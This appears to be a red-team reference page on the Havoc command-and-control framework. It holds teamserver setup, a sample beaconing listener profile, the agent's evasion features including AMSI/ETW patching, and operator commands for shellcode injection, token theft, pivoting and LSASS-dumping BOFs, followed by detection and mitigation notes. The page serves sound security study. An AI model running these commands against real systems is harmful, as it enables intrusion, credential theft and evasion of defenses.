% Filename: 06-red-teaming/c2-frameworks/havoc.md
% Display name: Havoc C2
% Last update: 2026-02-11
% ATT&CK Tactics: TA0011 (Command and Control)
% ATT&CK Techniques: T1071.001 (Application Layer Protocol: Web Protocols)
% Authors: @TristanInSec

# Havoc C2

## Overview

Havoc is an open-source, post-exploitation C2 framework focused on Windows targets. It features a native C agent (Demon) with advanced evasion capabilities including indirect syscalls, sleep obfuscation, return address stack spoofing, and module stomping. Havoc provides a modern Qt-based GUI client for operators and supports multi-operator collaboration. It is designed as a modern, open-source alternative to Cobalt Strike.

## ATT&CK Mapping

- **Tactic:** TA0011 - Command and Control
- **Techniques:**
  - T1071.001 - Application Layer Protocol: Web Protocols

## Prerequisites

- Havoc: `apt install havoc` (Kali) or build from source
- Version: 0.7

## Techniques

### Server Setup

```bash
# Havoc
# https://github.com/HavocFramework/Havoc

# Start the teamserver with a profile
havoc server --profile /path/to/havoc.yaotl

# Start with default profile
havoc server --default

# Start with debug output
havoc server --profile /path/to/havoc.yaotl --verbose

# Start the GUI client
havoc client
```

### Teamserver Profile

```bash
# Havoc
# https://github.com/HavocFramework/Havoc

# Havoc uses .yaotl profile format for teamserver configuration
# Example profile structure (verified against /usr/share/havoc/profiles/):

# Teamserver {
#     Host = "0.0.0.0"
#     Port = 40056
#
#     Build {
#         Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
#         Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
#         Nasm = "/usr/bin/nasm"
#     }
# }
#
# Operators {
#     user "operator1" {
#         Password = "password123"
#     }
#
#     user "operator2" {
#         Password = "password456"
#     }
# }
#
# Listeners {
#     Http {
#         Name         = "https-listener"
#         Hosts        = ["<c2_domain>"]
#         HostBind     = "0.0.0.0"
#         HostRotation = "round-robin"
#         PortBind     = 443
#         PortConn     = 443
#         Secure       = true
#         UserAgent    = "Mozilla/5.0 ..."
#
#         Uris = ["/api/v1/update", "/api/v1/status"]
#
#         Headers = [
#             "X-Requested-With: XMLHttpRequest",
#             "Content-Type: application/json"
#         ]
#
#         Response {
#             Headers = [
#                 "Content-Type: application/json",
#                 "Server: nginx"
#             ]
#         }
#     }
# }
#
# Demon {
#     Sleep  = 10
#     Jitter = 20
#
#     Injection {
#         Spawn64 = "C:\\Windows\\System32\\notepad.exe"
#         Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
#     }
# }
```

### Demon Agent Features

```bash
# Havoc
# https://github.com/HavocFramework/Havoc

# The Demon agent (C-based, Windows) includes built-in evasion:

# Evasion Features:
#   - Indirect Syscalls — bypass userland API hooks
#   - Sleep Obfuscation — encrypt Demon in memory while sleeping
#     Options: Ekko, Ziliean, Foliage
#   - Return Address Stack Spoofing — hide call stack origin
#   - Module Stomping — load Demon into a legitimate DLL's memory
#   - PE header stomping — overwrite PE headers after loading
#   - Block DLLs — prevent non-Microsoft DLLs in child processes
#   - AMSI/ETW patching — automatic bypass at agent startup

# Build Options (via GUI):
#   Agent Type:     Demon (only current option)
#   Listener:       Select configured HTTP/S listener
#   Architecture:   x64
#   Format:         Windows EXE, Windows Service EXE, Windows DLL, Shellcode
#   Sleep Technique: Ekko, Ziliean, Foliage
#   Injection:      Spawn64/Spawn32 process for fork&run
#   Jitter:         0-100%
```

### Demon Commands

```c2
# Havoc
# https://github.com/HavocFramework/Havoc

# --- System Information ---
demon > whoami
demon > pwd
demon > ps                    # Process list
demon > env                   # Environment variables

# --- File System ---
demon > dir <path>
demon > cd <path>
demon > upload /local/path C:\remote\path
demon > download C:\remote\file /local/path
demon > mkdir <path>
demon > rm <path>
demon > cp <src> <dst>
demon > mv <src> <dst>
demon > cat <file>

# --- Execution ---
demon > shell whoami /all     # Execute via cmd.exe
demon > powershell Get-Process # Execute via PowerShell
demon > dotnet inline-execute /path/to/assembly.exe [args]  # .NET in-memory
demon > shellcode inject x64 <pid> /path/to/shellcode.bin   # Shellcode injection

# --- Token Manipulation ---
demon > token steal <pid>     # Steal token from process
demon > token make <domain> <user> <password>  # Create token
demon > token revert          # Revert to original token
demon > token list            # List stolen tokens

# --- Pivoting ---
demon > socks add <port>      # Start SOCKS5 proxy
demon > socks list            # List active proxies
demon > socks kill <port>      # Stop a proxy
demon > rportfwd add <local_port> <target_ip> <target_port>

# --- Evasion ---
demon > sleep <seconds> <jitter>           # Change beacon interval
demon > proc blockdll on                   # Block non-MS DLLs in children
```

### BOF Support

```c2
# Havoc
# https://github.com/HavocFramework/Havoc

# Havoc supports Cobalt Strike-compatible Beacon Object Files (BOFs)
# BOFs run in the Demon process without spawning a new process

# Load and execute a BOF
demon > inline-execute /path/to/bof.o [args]

# BOF compatibility means many community tools work:
#   - SA-bof (Situational Awareness BOFs)
#   - nanodump (LSASS dumping BOF)
#   - InlineWhispers (Direct syscalls BOF)
```

## Detection Methods

### Network-Based Detection

- HTTP/S traffic patterns matching Havoc C2 profile URIs
- TLS certificate anomalies (self-signed or mismatched)
- Beaconing patterns (regular interval with jitter)

### Host-Based Detection

- Sleep obfuscation: encrypted memory regions that periodically decrypt
- Indirect syscall patterns
- Token manipulation sequences
- BOF execution within a process

## Mitigation Strategies

- **EDR with kernel telemetry** — detect indirect syscalls and sleep obfuscation
- **Memory scanning** — detect decrypted Demon agent during active phase
- **Network monitoring** — profile HTTP/S beaconing patterns
- **Credential Guard** — protect against mimikatz and LSASS access

## References

### Official Documentation

- [Havoc Framework](https://github.com/HavocFramework/Havoc)

### MITRE ATT&CK

- [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
